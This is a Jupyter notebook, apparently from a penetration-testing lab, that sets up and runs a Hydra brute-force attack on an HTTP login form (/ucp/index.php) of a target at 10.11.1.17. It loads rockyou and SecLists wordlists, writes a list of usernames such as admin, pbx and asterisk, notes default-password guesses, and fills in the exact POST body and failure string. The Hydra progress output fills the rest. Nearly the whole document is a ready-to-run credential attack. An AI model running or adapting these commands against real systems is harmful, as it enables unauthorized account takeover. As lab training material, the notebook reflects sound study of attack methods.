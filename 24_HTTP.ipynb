{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "71341a4d-e0b2-4181-b3dc-33e741e6a2e0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.11.1.17\n"
     ]
    }
   ],
   "source": [
    "target = open('00_target.txt').read()\n",
    "%env TARGET={target}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "541ca49b-9e9a-488c-b937-aa1e0ab44fbd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n",
      "env: UL=/home/parallels/hax/SecLists/Usernames/Names/names.txt\n",
      "env: UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt\n"
     ]
    }
   ],
   "source": [
    "# %env PL=/usr/share/wordlists/SecLists/Passwords/probable-v2-top207.txt\n",
    "%env PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt\n",
    "\n",
    "%env UL=/home/parallels/hax/SecLists/Usernames/Names/names.txt\n",
    "%env UL_S=/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "a77122b9-3b8d-47e9-8401-1eac1371a55c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting my_usernames.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile my_usernames.txt\n",
    "admin\n",
    "pbx\n",
    "asterisk"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fcca7a9f-a3d3-4061-ae77-13022e43fcfd",
   "metadata": {},
   "source": [
    "Machine name, challenge name, target name, website name, admin:admin, admin:password, admin:123456\n",
    "\n",
    "Vary caps: password, PASSWORD, Password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "6a8a2a85-a5ef-47f2-a6f6-d3a3b170a938",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: DIR=/ucp/index.php\n",
      "env: BODY=token=d07dbab8a747022db519b0f6210ca787&username=^USER^&password=^PASS^&email=&quietmode=1&module=User&command=login\n",
      "env: COND=Invalid Login Credentials\n"
     ]
    }
   ],
   "source": [
    "%env DIR=/ucp/index.php\n",
    "%env BODY=token=d07dbab8a747022db519b0f6210ca787&username=^USER^&password=^PASS^&email=&quietmode=1&module=User&command=login\n",
    "%env COND=Invalid Login Credentials"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47d0f5e0-e089-49af-a9dc-36176a2fd9c2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 16:01:09\n",
      "[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task\n",
      "[DATA] attacking http-post-form://10.11.1.17:80/ucp/index.php:token=d07dbab8a747022db519b0f6210ca787&username=^USER^&password=^PASS^&email=&quietmode=1&module=User&command=login:Invalid Login Credentials\n",
      "[STATUS] 776.00 tries/min, 776 tries in 00:01h, 43032421 to do in 924:15h, 16 active\n",
      "[STATUS] 701.00 tries/min, 2103 tries in 00:03h, 43031094 to do in 1023:06h, 16 active\n",
      "[STATUS] 679.14 tries/min, 4754 tries in 00:07h, 43028443 to do in 1055:57h, 16 active\n",
      "[STATUS] 669.07 tries/min, 10036 tries in 00:15h, 43023161 to do in 1071:44h, 16 active\n",
      "[STATUS] 670.26 tries/min, 20778 tries in 00:31h, 43012419 to do in 1069:33h, 16 active\n",
      "[STATUS] 669.53 tries/min, 31468 tries in 00:47h, 43001729 to do in 1070:27h, 16 active\n",
      "[STATUS] 661.56 tries/min, 41678 tries in 01:03h, 42991519 to do in 1083:06h, 16 active\n",
      "[STATUS] 661.63 tries/min, 52269 tries in 01:19h, 42980928 to do in 1082:42h, 16 active\n",
      "[STATUS] 656.67 tries/min, 62384 tries in 01:35h, 42970813 to do in 1090:38h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L my_usernames.txt -u -P $PLRY $TARGET http-post-form  \"$DIR:$BODY:$COND\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b107d61f-9333-4739-8474-ba12a7b17d6b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
